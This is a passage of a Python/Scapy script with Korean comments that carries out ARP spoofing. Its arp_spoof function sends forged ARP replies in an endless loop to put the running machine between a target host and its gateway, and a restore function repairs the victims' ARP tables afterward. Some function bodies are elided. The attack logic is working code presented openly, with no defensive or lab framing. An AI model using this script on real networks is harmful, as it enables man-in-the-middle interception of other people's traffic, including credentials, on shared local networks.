...
def get_mac(ip):
    ...
    # ARP 요청을 전송하여 MAC 주소를 검색 (L2 계층에서 동작)
...
def arp_spoof(target_ip, gateway_ip, target_mac, gateway_mac):
    """타겟과 게이트웨이 사이에서 L2 계층에서 ARP 스푸핑을 수행하는 함수"""
    print(f"[*] L2 ARP 스푸핑 시작: 타겟 {target_ip} <-> 게이트웨이 {gateway_ip}")
    
    try:
        while True:
            # 타겟에게 자신의 MAC 주소를 게이트웨이의 MAC 주소로 속여 ARP 응답 패킷 전송 (L2 계층)
            # Ether(dst=target_mac)으로 타겟에게 전송할 Ethernet 프레임을 생성, dst는 타겟의 MAC 주소
            sendp(Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
            print(f"[+] 타겟 {target_ip}에게 위조된 ARP 패킷 전송")
            
            # 게이트웨이에게 자신의 MAC 주소를 타겟의 MAC 주소로 속여 ARP 응답 패킷 전송 (L2 계층)
            # Ether(dst=gateway_mac)으로 게이트웨이에게 전송할 Ethernet 프레임을 생성, dst는 게이트웨이의 MAC 주소
            sendp(Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
...
def restore(target_ip, gateway_ip, target_mac, gateway_mac):
    """네트워크를 원래 상태로 복구하는 함수 (L2 계층)"""
    # 타겟과 게이트웨이에게 정상적인 ARP 패킷을 전송하여 ARP 테이블 복구
    # Ether(dst=target_mac)은 타겟에게, Ether(dst=gateway_mac)은 게이트웨이에게 전송
    sendp(Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=3, verbose=False)
    sendp(Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=3, verbose=False)
    print("[*] ARP 테이블 복구 완료.")
